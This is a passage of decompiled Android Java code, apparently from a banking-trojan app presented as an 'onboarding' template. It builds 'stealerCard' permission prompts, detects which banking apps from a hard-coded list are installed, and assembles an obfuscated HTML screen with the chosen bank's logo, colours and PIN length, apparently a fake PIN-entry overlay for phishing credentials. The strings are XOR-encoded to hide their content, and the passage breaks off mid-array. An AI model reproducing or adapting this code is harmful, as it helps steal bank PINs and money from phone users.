            LinearLayout linearLayout3 = new LinearLayout(this);
            linearLayout3.setOrientation(1);
            linearLayout3.setPadding(dp(16), 0, 0, 0);
            TextView textView = new TextView(this);
            textView.setText(stealerCard.title);
            textView.setTextColor(-1);
            textView.setTextSize(2, 17.0f);
            textView.getPaint().setFakeBoldText(true);
            linearLayout3.addView(textView);
            TextView textView2 = new TextView(this);
            textView2.setText(stealerCard.subtitle);
            textView2.setTextColor(-5592406);
            textView2.setTextSize(2, 13.0f);
            textView2.setPadding(0, dp(3), 0, 0);
            linearLayout3.addView(textView2);
            linearLayout2.addView(linearLayout3, new LinearLayout.LayoutParams(0, -2, 1.0f));
            TextView textView3 = new TextView(this);
            String str2 = OnboardingConfig.LANG;
            if (Intrinsics.areEqual(str2, strDecode2) ? true : Intrinsics.areEqual(str2, strDecode3) ? false : Intrinsics.areEqual(Locale.getDefault().getLanguage(), strDecode2)) {
                strDecode4 = strDecode5;
            }
            textView3.setText(strDecode4);
            textView3.setTextColor(-1);
            textView3.setTextSize(2, 15.0f);
            textView3.getPaint().setFakeBoldText(true);
            textView3.setGravity(17);
            textView3.setPadding(0, dp(14), 0, dp(14));
            GradientDrawable gradientDrawable2 = new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT, new int[]{-15043608, -15374912});
            gradientDrawable2.setCornerRadius(dp(28));
            textView3.setBackground(gradientDrawable2);
            textView3.setElevation(dp(6));
            textView3.setClickable(true);
            textView3.setFocusable(true);
            textView3.setOnClickListener(new View.OnClickListener() { // from class: com.base.template.OnboardingActivity$$ExternalSyntheticLambda21
                /* JADX WARN: Type inference failed for: r4v3, types: [kotlin.jvm.functions.Function0, kotlin.jvm.internal.Lambda] */
                @Override // android.view.View.OnClickListener
                public final void onClick(View view) {
                    int i2 = OnboardingActivity.$r8$clinit;
                    view.animate().scaleX(0.95f).scaleY(0.95f).setDuration(80L).withEndAction(new CoroutineWorker$$ExternalSyntheticLambda0(6, view)).start();
                    stealerCard.requestPermission.invoke();
                }
            });
            linearLayout.addView(linearLayout2);
            LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-1, -2);
            layoutParams.topMargin = dp(16);
            linearLayout.addView(textView3, layoutParams);
            FrameLayout frameLayout = this.cardContainer;
            if (frameLayout != null) {
                frameLayout.removeAllViews();
            }
            FrameLayout frameLayout2 = this.cardContainer;
            if (frameLayout2 != null) {
                frameLayout2.addView(linearLayout);
            }
            linearLayout.setTranslationY(dp(120));
            linearLayout.setAlpha(0.0f);
            linearLayout.animate().translationY(0.0f).alpha(1.0f).setDuration(450L).setInterpolator(new OvershootInterpolator(0.8f)).start();
            new Handler(Looper.getMainLooper()).postDelayed(new OnboardingActivity$$ExternalSyntheticLambda11(this, this.currentIndex, 2), 600L);
            return;
        }
        if (!OnboardingConfig.PIN_SCREEN_ENABLED) {
            finalizeSetup();
            return;
        }
        FrameLayout frameLayout3 = this.cardContainer;
        if (frameLayout3 != null && (viewPropertyAnimatorAnimate = frameLayout3.animate()) != null && (viewPropertyAnimatorAlpha = viewPropertyAnimatorAnimate.alpha(0.0f)) != null && (duration = viewPropertyAnimatorAlpha.setDuration(300L)) != null && (viewPropertyAnimatorWithEndAction = duration.withEndAction(new OnboardingActivity$$ExternalSyntheticLambda5(this, 5))) != null) {
            viewPropertyAnimatorWithEndAction.start();
        }
        if (Intrinsics.areEqual(OnboardingConfig.PIN_MODE, C0000.decode(new byte[]{81, 80, 93, 88}, "3133c4b9", 0.0f))) {
            List list = BankPinScreens.BANKS;
            PackageManager packageManager = getPackageManager();
            ArrayList arrayList = new ArrayList();
            for (BankPinScreens.BankConfig bankConfig2 : BankPinScreens.BANKS) {
                Iterator it = bankConfig2.packages.iterator();
                while (it.hasNext()) {
                    try {
                        packageManager.getPackageInfo((String) it.next(), 0);
                        arrayList.add(bankConfig2);
                        break;
                    } catch (Exception unused2) {
                    }
                }
            }
            Iterator it2 = arrayList.iterator();
            if (it2.hasNext()) {
                next = it2.next();
                if (it2.hasNext()) {
                    int i2 = ((BankPinScreens.BankConfig) next).priority;
                    do {
                        Object next2 = it2.next();
                        int i3 = ((BankPinScreens.BankConfig) next2).priority;
                        if (i2 > i3) {
                            next = next2;
                            i2 = i3;
                        }
                    } while (it2.hasNext());
                }
            } else {
                next = null;
            }
            bankConfig = (BankPinScreens.BankConfig) next;
        } else {
            bankConfig = null;
        }
        this.detectedBankId = bankConfig != null ? bankConfig.id : null;
        String strDecode6 = C0000.decode(new byte[]{125, 11, 69, 80, 75, 65, 105, 40, 118, 69, 82, 90, 93, 4}, "8e159a9a");
        if (bankConfig != null) {
            List list2 = BankPinScreens.BANKS;
            String str3 = OnboardingConfig.LANG;
            if (Intrinsics.areEqual(str3, strDecode2)) {
                zAreEqual = true;
            } else if (!Intrinsics.areEqual(str3, strDecode3)) {
                zAreEqual = Intrinsics.areEqual(Locale.getDefault().getLanguage(), strDecode2);
            }
            String str4 = bankConfig.accentColor;
            int i4 = bankConfig.maxPin;
            if (zAreEqual) {
                strDecode6 = C0000.decode(new byte[]{18, 19, 5, 5, 82, 2, 13, 64, 65, 5, 3, 82, 13, 15, 30, 18, 5, 0, 3, 2, 93, 22, 21, 87, 82, 3, 5, 94, 31, 23, 9, 1, 12, 0, 15, 19, 69, 1, 6, 95, 82, 15, 21, 70, 8, 4, 15, 6, 15, 16, 100, 124, 40, 29, 16, 69, 83, 4, 11, 87, 2, 18, 27, 0, 4, 8, 2, 14, 64, 19, 7, 86, 85, 2, 8}, "4045f06fb43e9481", 0);
            }
            String strDecode7 = bankConfig.id.equals(C0000.decode(new byte[]{13, 25, 88, 86}, "bc78a9e7bc3d")) ? C0000.decode(new byte[]{70, 11, 81, 69, 12, 3, 9, 7, 2, 66, 73}, "1b51d98122", false) : C0000.decode(new byte[]{78, 13, 1, 64, 93, 95, 7, 85, 69, 29}, "9de45e1e5e", 1);
            String strM = 4 < i4 ? NetworkType$EnumUnboxingLocalUtility.m(C0000.decode(new byte[]{68, 7, 69, 69, 1, 92, 6, 95, 1, 19, 88, 82, 95, 69, 72, 95, 87, 18, 114, 9, 7, 12, 7, 94, 22, 36, 76, 126, 85, 25, 65, 91, 84, 11, 16, 76, 89, 2, 76, 83, 14, 7, 70, 68, 127, 80, 11, 93, 15, 22, 94, 11, 76, 13, 7, 94, 5, 18, 93, 9, 12, 92, 8, 30, 20, 71, 91, 14, 93, 70, 9, 85, 27, 70, 86, 88, 95, 87, 15, 74, 95, 70, 68, 13, 13, 22, 69, 10, 69, 13, 80, 78, 17, 87, 8, 31, 9, 5, 25, 22, 22, 24, 14, 85, 76, 4, 84, 84, 90, 86, 20, 87, 71, 8, 83, 88, 18, 8, 12, 30, 14, 3, 91, 80, 69, 89, 88, 5, 95, 8, 8, 66}, "2f7ebab0bf5711f8", true), str4, C0000.decode(new byte[]{18, 95, 68, 17, 65, 89, 91, 16, 67, 83, 70, 93, 91, 17, 68, 94, 80, 22, 70, 23, 74, 94, 81, 22, 86, 10, 15, 10, 65, 5, 69, 10, 93, 28, 88, 93, 91, 2, 23, 13, 13, 5, 88, 13, 12, 21, 23, 94, 83, 3, 68, 95, 20, 27, 13, 91, 11, 21}, "5ece385c3248", 1)) : "";
            strReplace$default = C0000.decode(new byte[]{15, 20, 124, 126, 37, 53, 106, 101, 125, 17, 14, 21, 94, 89, 6, 59, 90, 9, 71, 88, 84, 17, 10, 0, 93, 82, 5, 19, 20, 20, 17, 11, 4, 89, 3, 0, 87, 11, 4, 92, 3, 21, 82, 21, 91, 89, 7, 19, 64, 80, 76, 12, 68, 52, 103, 115, 21, 9, 68, 95, 57, 9, 85, 84, 18, 0, 19, 91, 89, 92, 3, 92, 17, 67, 81, 84, 17, 17, 92, 71, 76, 19, 70, 2, 92, 91, 76, 84, 8, 21, 14, 23, 79, 88, 2, 21, 91, 8, 92, 84, 16, 8, 80, 80, 21, 70, 15, 5, 71, 93, 20, 88, 8, 8, 71, 92, 89, 93, 75, 18, 80, 84, 84, 84, 91, 80, 29, 5, 20, 92, 7, 25, 90, 88, 77, 92, 75, 18, 80, 84, 84, 84, 91, 80, 29, 5, 20, 68, 21, 4, 65, 24, 75, 82, 7, 13, 82, 87, 84, 84, 91, 15, 92, 23, 6, 59, 90, 18, 71, 76, 84, 84, 88, 107, 25, 78, 85, 80, 20, 6, 90, 91, 2, 1, 93, 17, 82, 81, 92, 88, 8, 6, 9, 5, 3, 83, 9, 25, 30, 70, 81, 75, 15, 15, 84, 15, 90, 94, 20, 5, 86, 71, 21, 83, 9, 25, 8, 24, 79, 84, 4, 10, 90, 65, 21, 69, 7, 17, 30, 93, 81, 86, 14, 13, 90, 82, 80, 69, 75, 2, 92, 89, 87, 67, 92, 21, 65, 84, 86, 66, 22, 0, 65, 80, 86, 69, 93, 20, 64, 80, 74, 28, 21, 4, 95, 80, 91, 69, 92, 15, 92, 91, 93, 76, 108, 9, 71, 88, 84, 29, 4, 14, 87, 76, 67, 89, 3, 8, 84, 93, 76, 11, 87, 81, 3, 16, 3, 94, 16, 4, 65, 83, 84, 94, 17, 91, 91, 92, 92, 85, 3, 15, 78, 63, 90, 94, 2, 24, 72, 83, 87, 95, 18, 76, 85, 84, 85, 88, 10, 24, 9, 24, 89, 65, 22, 13, 86, 24, 75, 72, 21, 21, 86, 88, 20, 115, 10, 8, 93, 94, 117, 80, 5, 50, 74, 70, 76, 84, 11, 39, 92, 91, 76, 29, 65, 50, 86, 82, 87, 84, 70, 52, 122, 18, 20, 22, 52, 14, 81, 90, 76, 94, 65, 77, 64, 84, 86, 66, 75, 18, 86, 71, 81, 87, 93, 3, 82, 86, 83, 86, 20, 14, 70, 91, 92, 11, 69, 7, 85, 83, 3, 82, 9, 13, 92, 71, 2, 18, 87, 0, 2, 84, 9, 80, 93, 5, 90, 70, 72, 93, 7, 24, 9, 83, 84, 84, 30, 90, 85, 89, 93, 73, 75, 5, 90, 71, 93, 82, 18, 8, 92, 91, 2, 82, 9, 13, 70, 88, 86, 10, 7, 13, 90, 82, 86, 28, 15, 21, 86, 88, 75, 11, 5, 4, 93, 65, 93, 67, 93, 11, 70, 70, 76, 88, 0, 24, 30, 86, 87, 95, 18, 4, 93, 65, 2, 87, 10, 4, 75, 24, 75, 69, 7, 19, 71, 14, 72, 80, 2, 5, 90, 91, 95, 28, 18, 14, 67, 15, 14, 1, 22, 25, 78, 63, 22, 93, 9, 6, 92, 78}, "3581fa") + strDecode7 + C0000.decode(new byte[]{2, 93, 3, 23, 87, 95, 88, 73, 82, 11, 17, 77, 14, 94, 13, 85, 9, 64, 26, 24, 58, 24, 70, 13, 94, 73, 17, 80, 21, 95, 82, 26, 95, 95, 12, 17, 29, 69, 95, 30, 85, 94, 84, 1, 17, 75, 12, 7, 86, 94, 22, 72, 71, 83, 95, 3, 88, 16, 95, 12, 81, 3, 12, 12, 88, 66, 5, 12, 94, 27, 84, 11, 68, 16, 10, 84, 91, 0, 7, 17, 65, 11, 1, 10, 92, 89, 68, 94, 19, 87, 86, 10, 28, 57, 25, 5, 86, 68, 17, 30, 84, 95, 69, 20, 92, 5, 28, 3, 7, 95, 82, 25, 2, 90, 23, 22, 68, 95, 80, 29, 29, 7, 10, 87, 21, 86, 89, 21, 3, 83, 7, 11, 68, 83, 68, 95, 87, 5, 21, 3, 80, 1, 71, 25, 2, 93, 3, 23, 87, 95, 88, 73, 82, 11, 17, 77, 14, 94, 13, 85, 9, 64, 26, 94, 93, 95, 88, 73, 88, 1, 12, 94, 9, 71, 13, 83, 9, 64, 26, 24, 58, 24, 82, 11, 68, 31, 18, 80, 5, 71, 95, 91, 8, 4, 18, 29, 11, 94, 83, 13, 87, 12, 17, 3, 80, 7, 71, 25, 2, 82, 13, 23, 84, 83, 68, 73, 66, 5, 1, 80, 20, 64, 13, 84, 9, 21, 89, 7, 81, 85, 93, 3, 66, 11, 16, 87, 5, 9}, "90be066d0de9a37a", true) + str4 + C0000.decode(new byte[]{90, 23, 68, 87, 8, 18, 95, 10, 19, 88, 95, 17, 1, 82, 88, 80, 73, 83, 31, 13, 7, 15, 80, 8, 0, 65, 12, 13, 12, 9, 68, 90, 17, 67, 24, 4, 83, 18, 25, 6, 20, 87, 12, 1, 79, 81, 81, 79, 8, 6, 68, 30, 72, 82, 13, 73, 80, 27, 80, 84, 78, 29, 2, 1, 77, 82, 31, 22, 0, 14, 75, 18, 0, 71, 1, 17, 31, 57, 116, 94, 4, 26, 80, 68, 7, 12, 92, 22, 65, 69, 10, 18, 25, 71, 91, 78, 21, 17, 87, 88, 21, 7, 86, 23, 12, 15, 22, 1, 3, 95, 81, 29, 80, 74, 75, 75, 108, 79, 93, 10, 21, 27, 10, 23, 22, 72, 85, 91, 8, 14, 87, 66, 15, 14, 87, 95, 18, 93, 23, 11, 12, 88, 20, 27, 83, 16, 22, 83, 7, 18, 92, 69, 7, 90, 23, 21, 3, 65, 80, 70, 28, 105, 118, 93, 3, 24, 95, 23, 0, 88, 0, 17, 66, 64, 92, 71, 8, 13, 93, 77, 18, 14, 66, 17, 19, 84, 11, 17, 4, 92, 70, 88, 91, 16, 85, 87, 10, 4, 17, 85, 72, 72, 24, 104, 76, 88, 81, 76, 17, 2, 82, 77, 2, 8, 74, 21, 13, 84, 28, 88, 5, 65, 93, 81, 90, 4, 68, 95, 2, 76, 77, 0, 12, 69, 9, 3, 22, 86, 25, 86, 14, 15, 67, 91, 8, 18, 3, 23, 4, 69, 0, 3, 22, 27, 7, 25, 86, 83, 70, 78, 79, 90, 94, 4, 17, 15, 84, 84, 18, 75, 15, 95, 20, 16, 66, 95, 0, 24, 20, 6, 14, 91, 17, 7, 12, 71, 14, 86, 4, 13, 66, 83, 20, 28, 51, 75, 10, 80, 28, 25, 21, 90, 80, 65, 9, 89, 1, 6, 22, 25, 2, 13, 4, 92, 2, 10, 22, 9, 3, 5, 17, 27, 13, 84, 9, 19, 93, 0, 19, 24, 23, 3, 6, 90, 65, 70, 91, 86, 6, 19, 93, 3, 88, 6, 10, 82, 23, 13, 23, 93, 80, 15, 66, 5, 4, 80, 84, 7, 11, 94, 3, 90, 23, 6, 7, 65, 14, 91, 14, 13, 83, 13, 0, 14, 87, 17, 76, 70, 12, 24, 7, 9, 6, 1, 17, 27, 13, 80, 9, 15, 77, 72, 22, 80, 12, 5, 10, 71, 14, 1, 81, 83, 13, 85, 19, 19, 74, 10, 19, 15, 21, 13, 11, 93, 64, 80, 19, 88, 66, 68, 7, 15, 74, 12, 21, 92, 10, 12, 88, 82, 88, 89, 65, 77, 7, 3, 21, 65, 92, 4, 18, 80, 94, 79, 21, 86, 86, 94, 8, 23, 27, 66, 7, 17, 20, 13, 8, 82, 13, 14, 11, 84, 92, 65, 76, 0, 89, 90, 9, 19, 3, 17, 19, 84, 11, 17, 18, 82, 70, 80, 15, 23, 13, 82, 15, 18, 73, 9, 0, 76, 95, 4, 14, 86, 76, 14, 0, 15, 95, 81, 8, 76, 80, 17, 4, 88, 22, 88, 1, 86, 90, 65, 4, 17, 13, 92, 19, 18, 77, 12, 7, 76, 72, 1, 13, 93, 64, 80, 15, 23, 12, 85, 3, 15, 77, 0, 19, 14, 6, 13, 14, 92, 70, 15, 66, 82, 87, 7, 7, 80, 88, 24, 107, 27, 14, 7, 27, 9, 85, 86, 21, 10, 64, 83, 29, 3, 88, 6, 10, 82, 23, 13, 23, 93, 80, 15, 66, 6, 6, 83, 86, 4, 9, 94, 21, 71, 4, 12, 17, 85, 91, 71, 12, 89, 69, 85, 7, 13, 92, 77, 79, 12, 87, 75, 31, 57, 26, 94, 4, 26, 24, 80, 8, 26, 91, 4, 2, 94, 2, 16, 13, 70, 90, 81, 91, 23, 68, 87, 8, 18, 73, 4, 19, 80, 11, 22, 89, 85, 91, 91, 21, 78, 69, 95, 28, 4, 3, 87, 81, 69, 29, 89, 1, 92, 88, 90, 19, 89, 21, 14, 94, 89, 68, 111, 79, 94, 0, 27, 76, 85, 90, 15, 0, 0, 66, 95, 16, 4, 66, 6, 14, 89, 10, 16, 88, 16, 7, 6, 82, 30, 60, 24, 13, 4, 64, 75, 2, 90, 11, 4, 11, 65, 89, 78, 3, 2, 85, 93, 1, 19, 86, 16, 15, 81, 95}, "ac66fa9ea5ebb345", 7) + str4 + C0000.decode(new byte[]{9, 80, 93, 94, 12, 17, 94, 65, 2, 3, 80, 95, 84, 92, 92, 70, 78, 16, 13, 24, 1, 95, 4, 84, 66, 75, 9, 84, 12, 13, 16, 79, 19, 0, 95, 3, 90, 71, 8, 4, 83, 83, 95, 6, 13, 22, 70, 8, 83, 74, 8, 92, 12, 13, 1, 31, 110, 75, 93, 1, 75, 29, 81, 93, 13, 5, 13, 16, 9, 95, 87, 7, 70, 90, 68, 87, 24, 12, 20, 3, 7, 12, 66, 29, 8, 29, 10, 79, 105, 77, 15, 7, 29, 75, 85, 11, 92, 85, 91, 64, 14, 77, 23, 10, 11, 18, 77, 0, 91, 64, 66, 94, 2, 26, 94, 4, 8, 0, 78, 25, 56, 15, 29, 65, 23, 26, 8, 7, 90, 89, 25, 12, 87, 82, 86, 12, 95, 1, 11, 6, 29, 91, 60, 88, 91, 94, 85, 18, 16, 17, 7, 95, 70}, "2322ccdbde6d", true) + bankConfig.logoDataUri + C0000.decode(new byte[]{26, 25, 80, 93, 88, 16, 71, 13, 18, 91, 87, 94, 92, 19, 25, 2, 88, 68, 13, 21, 26, 7, 57, 13, 93, 10, 66, 16, 83, 91, 89, 74, 64, 12, 27, 19, 93, 94, 29, 67, 81, 77, 95, 84, 27, 93}, "89319c4007", 0.0f) + strDecode6 + C0000.decode(new byte[]{10, 25, 0, 93, 67, 8, 60, 12, 82, 95, 78, 69, 0, 8, 83, 21, 69, 11, 70, 80, 90, 66, 69, 18, 22, 95, 92, 88, 65, 0, 93, 18, 69, 20, 90, 8, 26, 82, 95, 70, 8, 60, 4, 1, 10, 18, 18, 5, 90, 87, 23, 71, 8, 20, 93, 85, 79, 70, 89, 1, 65, 68, 91, 2, 11, 20, 15, 68, 23, 8, 60, 12, 82, 95, 78, 69, 0, 8, 83, 21, 69, 11, 70, 95, 80, 79, 20, 16, 89, 88, 91, 9, 10, 7, 89, 91, 20, 70, 76, 5, 28, 20, 8, 1, 10, 25, 92, 12, 21, 90, 14, 2, 95, 64, 68, 87, 89, 87, 69, 67, 11, 20, 83, 0, 26, 70, 18, 9, 88, 85, 8, 93, 86, 93, 11, 18, 70, 30, 10, 76, 65, 90, 0, 90, 25, 82, 13, 66, 11, 10, 82, 89, 64, 22, 91, 9, 2, 23, 65, 91, 20, 93, 1, 77, 23, 22, 89, 94, 85, 90, 81, 6, 8, 89, 16, 22, 30, 5, 77, 22, 11, 5, 10, 31, 82, 95, 78, 91, 105, 88, 86, 15, 64, 22, 7, 88, 84, 69, 69, 13, 20, 93, 93, 28, 65, 68, 93, 8, 85, 90, 13, 87, 94, 11, 20, 64, 30, 2, 17, 71, 93, 80, 14, 73, 82, 95, 18, 10, 9, 82, 95, 70, 22, 85, 84, 4, 16, 23, 15, 68, 93, 83, 29, 22, 21, 89, 88, 83, 90, 95, 91, 14, 94, 70, 66, 78, 3, 31, 70, 10, 0, 10, 25, 84, 95, 64, 6, 89, 7, 13, 68, 70, 85, 90, 5, 71, 70, 11, 20, 91, 83, 79, 26, 69, 12, 10, 81, 10, 95, 85, 15, 9, 23, 70, 30, 6, 31, 20, 6, 83, 95, 75, 86, 15, 64, 8, 110, 8, 81, 95, 64, 16, 85, 90, 89, 22, 16, 89, 16, 13, 83, 79, 70, 20, 90, 88, 85, 92, 95, 85, 83, 88, 65, 20, 26, 81, 31, 20, 90, 3, 9, 25, 82, 89, 64, 8, 4, 1, 10, 18, 18, 5, 90, 87, 23, 71, 8, 20, 93, 85, 79, 20, 24, 10, 13, 7, 94, 15, 85, 93, 89, 22, 69, 30, 14, 25, 20, 8, 0, 89, 76, 0, 91, 16, 8, 10, 0, 93, 67, 22, 85, 92, 87, 69, 75, 88, 65, 15, 87, 31, 20, 22, 11, 90, 86, 90, 95, 83, 93, 11, 26, 21, 75, 93, 27, 68, 8, 15, 88, 27, 81, 95, 64, 14, 60, 10, 92, 12, 21, 68, 81, 10, 87, 69, 23, 9, 23, 93, 83, 73, 22, 80, 86, 71, 67, 13, 86, 91, 20, 85, 2, 89, 23, 22, 89, 94, 85, 90, 81, 6, 8, 89, 16, 21, 67, 84, 76, 29, 23, 8, 16, 19, 78, 4, 15, 84, 80, 95, 14, 73, 82, 95, 18, 10, 9, 82, 95, 70, 22, 85, 84, 4, 16, 23, 15, 68, 93, 83, 29, 22, 21, 89, 88, 83, 90, 95, 91, 14, 94, 70, 66, 78, 6, 31, 70, 10, 5, 10, 25, 84, 95, 64, 6, 89, 7, 13, 68, 70, 85, 90, 5, 71, 70, 11, 20, 91, 83, 79, 24, 3, 13, 70, 18, 9, 88, 85, 8, 93, 86, 93, 11, 18, 82, 83, 84, 77, 74, 70, 12, 64, 21, 78, 86, 7, 7, 116, 13, 12, 25, 82, 81, 19, 93, 110, 14, 73, 82, 95, 18, 10, 63, 10, 69, 83, 68, 95, 72, 17, 93, 110, 68, 7, 68, 22, 20, 93, 91, 11, 17, 23, 26, 90, 83, 88, 5, 5, 94, 21, 83, 26, 9, 90, 8, 2, 26, 93, 78, 11}, "66d45660668ecd2f", 7) + i4 + C0000.decode(new byte[]{25, 4, 86, 65, 9, 93, 90, 5, 76, 84, 81, 87, 65, 72, 94, 92, 64, 124, 89, 3, 84, 92, 90, 77, 119, 31, 112, 93, 28, 30, 81, 9, 77, 74, 19, 16, 14, 108, 95, 76, 90, 90, 65, 15, 86, 87, 20, 73, 29, 8, 16, 66, 93, 95, 29, 10, 82, 69, 72, 73, 92, 8, 23, 85, 81, 87, 82, 18, 81, 7, 9, 84, 77, 79, 75, 92, 64, 76, 71, 8, 2, 73, 93, 87, 30, 91, 87, 2, 66, 88, 71, 70, 93, 4, 80, 86, 86, 19, 84, 92, 90, 77, 27, 5, 75, 92, 85, 77, 80, 35, 85, 92, 89, 92, 91, 18, 17, 30, 80, 80, 67, 65, 16, 2, 80, 23, 86, 10, 88, 74, 71, 119, 84, 11, 92, 4, 19, 93, 90, 18, 30, 2, 86, 86, 77, 72, 88, 73, 68, 92, 91, 2, 122, 81, 93, 85, 81, 78, 93, 16, 15}, "5f9949", false) + strM + C0000.decode(new byte[]{95, 93, 83, 28, 72, 92, 10, 26, 89, 81, 86, 82, 16, 92, 8, 9, 5, 88, 28, 29, 78, 88, 83, 8, 16, 70, 64, 81, 3, 70, 1, 64, 97, 93, 85, 80, 11, 65, 65, 28, 94, 64, 10, 87, 65, 93, 87, 91, 76, 29, 78, 117, 86, 81, 22, 91, 92, 80, 22, 90, 10, 100, 92, 90, 125, 91, 16, 81, 71, 81, 92, 29, 20, 93, 91, 29, 69, 25, 82, 4, 5, 29, 69, 72, 110, 82, 64, 90, 91, 65, 13, 91, 91, 20, 92, 80, 8, 28, 28, 79, 81, 83, 76, 88, 94, 72, 68, 20, 20, 93, 91, 26, 84, 80, 10, 83, 65, 92, 17, 71, 1, 64, 64, 70, 86, 14, 20, 93, 91, 9, 72, 92, 10, 26, 70, 88, 81, 86, 1, 28, 5, 24, 21, 4, 77, 15, 67, 85, 74, 21, 8, 85, 70, 64, 5, 87, 11, 76, 27, 88, 89, 70, 16, 119, 93, 93, 84, 81, 95, 93, 83, 28, 84, 84, 23, 64, 28, 79, 84, 84, 23, 64, 27, 87, 84, 84, 23, 71, 123, 85, 85, 80, 89, 19, 81, 91, 76, 21, 11, 65, 65, 19, 3, 70, 1, 64, 97, 93, 85, 80, 11, 65, 65, 28, 94, 64, 10, 87, 65, 93, 87, 91, 76, 29, 78, 93, 94, 29, 8, 85, 70, 64, 22, 69, 5, 70, 80, 90, 76, 123, 11, 80, 80, 29, 84, 84, 23, 64, 27, 68, 89, 71, 1, 90, 65, 122, 87, 81, 1, 26, 71, 81, 85, 90, 18, 81, 118, 92, 81, 89, 0, 28, 89, 85, 75, 65, 77, 73, 25, 6, 8, 5, 77, 73, 14}, "d45485") + strM + C0000.decode(new byte[]{74, 61, 95, 22, 88, 90, 67, 94, 86, 13, 22, 74, 66, 85, 17, 74, 77, 80, 81, 31, 85, 8, 74, 69, 71, 94, 87, 77, 90, 92, 89, 80, 77, 11, 10, 84, 89, 30, 75, 6, 66, 76, 69, 89, 2, 15, 93, 4, 67, 69, 76, 6, 13, 74, 82, 67, 109, 10, 91, 92, 88, 66, 77, 75, 80, 76, 89, 84, 77, 10, 89, 87, 31, 30, 66, 34, 88, 93, 69, 88, 80, 7, 24, 86, 89, 103, 80, 13, 115, 87, 67, 82, 75, 6, 82, 17, 71, 94, 87, 74, 75, 21, 1, 7, 9, 74, 75, 51, 11, 24, 74, 0, 68, 80, 71, 67, 7, 95, 25, 91, 88, 83, 64, 93, 10, 22, 95, 67, 84, 15, 8}, "779c69", true);
            color = -1;
        } else {
            String str5 = OnboardingConfig.LANG;
            boolean zAreEqual2 = Intrinsics.areEqual(str5, strDecode2) ? true : Intrinsics.areEqual(str5, strDecode3) ? false : Intrinsics.areEqual(Locale.getDefault().getLanguage(), strDecode2);
            String strDecode8 = C0000.decode(new byte[]{-24, -13, -27, -47, -74, -47, -74, -43, -30, -120, -26, -73, -78, -122, 18, 100, 113, 47, 24, -77, -36, -76, -40, -79, -122}, "8a5cfdfa2075b324", false);
            if (zAreEqual2) {
                strDecode6 = strDecode8;
            }
            if (Intrinsics.areEqual(str5, strDecode2)) {
                zAreEqual = true;
            } else if (!Intrinsics.areEqual(str5, strDecode3)) {
                zAreEqual = Intrinsics.areEqual(Locale.getDefault().getLanguage(), strDecode2);
            }
            String strDecode9 = C0000.decode(new byte[]{-76, -10, -29, -35, -26, -19, 66, -26, -38, -26, -71, -78, -36, -27, -38, -78, -120, -73, -69, -78, -43, -26, -36, -25, -118, -78, -45, -27, -39, -78, -117, -73, -72, 66, -78, -119, -77, -73, -24, -38, -77, -114, -76, -36, -29, -48, -25, -41, -78, -117, -78, -113, -23, -19, 95, 87, 22, 92, -29, -44, -25, -48, -78, -125, -78, -125, -24, -38, -78, -73, -76, -41, 19, 82, 26, -78, -43, -26, -33, -25, -120, -77, -28, -27, -39, -77, -72, -74, -114, 66, 50, 127, 44, 26, -24, -40, -77, -117, -76, -42}, "db3f7bb6b78bc5", true);
            strReplace$default = StringsKt__StringsJVMKt.replace$default(StringsKt__StringsJVMKt.replace$default(C0000.decode(new byte[]{90, 69, 39, 120, 123, 109, 58, 104, 33, 69, 80, 22, 11, 90, 88, 110, 95, 95, 76, 84, 15, 24, 8, 4, 86, 5, 91, 20, 20, 17, 65, 9, 4, 81, 6, 89, 0, 91, 4, 15, 3, 66, 7, 68, 0, 95, 89, 75, 16, 93, 16, 88, 26, 55, 50, 112, 75, 92, 65, 9, 50, 5, 14, 93, 16, 4, 24, 12, 7, 91, 3, 89, 65, 65, 81, 92, 20, 72, 11, 23, 76, 64, 70, 85, 9, 10, 23, 82, 86, 77, 94, 26, 19, 12, 92, 22, 14, 11, 2, 1, 21, 94, 91, 92, 78, 79, 13, 1, 76, 10, 74, 95, 8, 13, 23, 94, 89, 85, 78, 75, 7, 4, 84, 7, 91, 7, 72, 84, 79, 90, 89, 65, 10, 85, 17, 8, 21, 17, 5, 87, 10, 1, 94, 6, 22, 9, 79, 77, 23, 0, 74, 79, 21, 85, 7, 8, 2, 85, 84, 92, 94, 86, 11, 71, 6, 104, 90, 69, 18, 29, 15, 82, 6, 51, 73, 67, 9, 4, 74, 5, 15, 88, 92, 84, 88, 71, 89, 93, 7, 81, 10, 2, 2, 82, 93, 84, 9, 28, 78, 68, 81, 67, 10, 86, 3, 95, 90, 13, 20, 82, 3, 22, 78, 85, 87, 65, 88, 21, 19, 0, 90, 9, 15, 66, 75, 16, 2, 71, 21, 81, 10, 95, 12, 9, 81, 5, 14, 66, 75, 7, 12, 91, 87, 75, 89, 76, 22, 4, 86, 17, 22, 87, 20, 1, 13, 67, 3, 76, 16, 93, 22, 72, 75, 7, 10, 83, 5, 16, 89, 89, 87, 87, 6, 69, 110, 13, 76, 15, 10, 26, 4, 11, 7, 78, 67, 81, 6, 81, 3, 13, 76, 88, 87, 6, 86, 65, 88, 88, 78, 92, 17, 94, 8, 10, 79, 88, 14, 95, 2, 0, 6, 89, 69, 51, 1, 87, 0, 28, 67, 4, 9, 88, 18, 73, 5, 86, 85, 80, 15, 65, 94, 72, 89, 18, 22, 90, 3, 73, 16, 78, 75, 77, 6, 85, 72, 39, 84, 11, 8, 93, 43, 5, 0, 100, 65, 74, 23, 93, 9, 35, 87, 12, 18, 26, 65, 55, 6, 80, 87, 92, 67, 109, 45, 66, 20, 69, 52, 89, 4, 11, 23, 88, 31, 21, 16, 89, 10, 22, 21, 17, 3, 68, 15, 2, 88, 85, 89, 90, 8, 95, 22, 10, 77, 12, 2, 12, 69, 84, 2, 7, 89, 9, 5, 3, 7, 10, 84, 13, 20, 12, 69, 2, 5, 81, 3, 93, 10, 75, 20, 9, 89, 27, 92, 80, 10, 1, 27, 12, 94, 85, 6, 64, 73, 1, 81, 16, 3, 85, 18, 13, 12, 89, 2, 90, 12, 84, 17, 8, 86, 89, 7, 90, 15, 3, 13, 26, 81, 77, 6, 85, 23, 95, 91, 7, 8, 66, 3, 22, 88, 93, 77, 74, 23, 81, 2, 28, 21, 1, 9, 88, 18, 1, 13, 67, 2, 90, 6, 86, 16, 0, 74, 31, 108, 24, 5, 11, 13, 67, 89, 80, 13, 93, 22, 30, 79, 11, 2, 66, 14, 94, 82, 7, 8, 28, 88, 85, 5, 29, 21, 21, 15, 82, 18, 12, 89, 4, 14, 9, 19, 64, 95, 21, 89, 6, 2, 95, 8, 3, 89, 5, 12, 73, 27, 3, 